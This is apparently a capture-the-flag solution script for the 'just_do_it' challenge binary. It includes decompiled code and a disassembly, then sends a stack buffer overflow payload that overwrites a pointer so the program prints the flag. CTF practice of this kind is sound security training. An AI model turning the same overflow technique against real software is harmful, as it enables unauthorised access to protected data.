from pwn import *
'''
undefined4 main(void)

{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);
  if (pcVar1 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}
'''

#load process
p = process('./just_do_it')
#  compare EBP-0x10 and print the flag 
# address 0804a080
address = p32(0x0804a080)

"""
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main(undefined1 param_1)
             undefined         AL:1           <RETURN>
             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     080485bb(*)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     080485c2(R)  
             undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     08048704(R)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[2]:     0804860d(W), 
                                                                                                   080486ee(W)  
             undefined4        Stack[-0x18]:4 local_18                                XREF[3]:     08048625(W), 
                                                                                                   08048628(R), 
                                                                                                   0804864b(R)  
             undefined1        Stack[-0x28]:1 local_28                                XREF[2]:     080486a6(*), 
                                                                                                   080486d9(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:080484d7(*), 0804886c, 
                                                                                          080488c8(*)  
        080485bb 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]

"""
# Stack[-0x14]:4 output - Stack[-0x28]:1 input
offset  = "A" * 20 
payload = offset + address
p.sendline(payload)
p.interactive()
